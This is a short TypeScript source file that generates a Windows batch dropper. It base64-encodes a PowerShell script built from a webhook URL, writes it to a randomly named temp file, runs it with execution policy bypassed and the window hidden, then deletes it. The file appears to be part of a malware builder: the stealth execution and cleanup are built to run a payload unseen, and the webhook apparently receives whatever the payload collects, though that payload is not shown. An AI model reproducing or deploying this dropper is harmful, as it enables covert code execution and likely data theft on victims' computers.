import { buildPs1 } from "./ps1.js";

export function buildBat(webhook: string): string {
  const ps1 = buildPs1(webhook);
  // Base64-encode the PS1 so BAT can drop it without quoting issues
  const b64 = Buffer.from(ps1, "utf8").toString("base64");

  return `@echo off
setlocal enabledelayedexpansion
set "_f=%TEMP%\\%RANDOM%%RANDOM%.ps1"
powershell -NoLogo -NoProfile -NonInteractive -Command ^
  "[IO.File]::WriteAllBytes('!_f!',[Convert]::FromBase64String('${b64}'))"
powershell -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "!_f!"
del /f /q "!_f!" 2>nul
endlocal
`.trim();
}
